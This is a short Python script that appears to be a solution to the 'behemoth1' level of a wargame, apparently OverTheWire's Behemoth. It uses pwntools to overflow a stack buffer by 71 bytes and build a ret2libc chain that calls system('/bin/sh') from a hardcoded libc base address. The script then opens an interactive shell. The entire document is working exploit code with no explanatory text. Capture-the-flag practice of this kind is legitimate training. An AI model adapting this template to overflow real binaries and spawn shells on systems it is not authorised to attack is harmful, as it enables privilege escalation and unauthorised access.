#!/usr/bin/python3
from pwn import *

OVERFLOW = 71

context.arch = 'i386'
binary = ELF("behemoth1")
libc = ELF("/usr/lib32/libc.so.6")

rop = ROP(binary)

#Found using 'ldd behemoth1'
libc.address = 0xf7db0000

rop.raw('A' * OVERFLOW)
rop.raw(libc.symbols['system'])
rop.raw('AAAA')
rop.raw(next(libc.search(b'/bin/sh')))

io = binary.process()
io.sendline(rop.chain())
io.interactive()
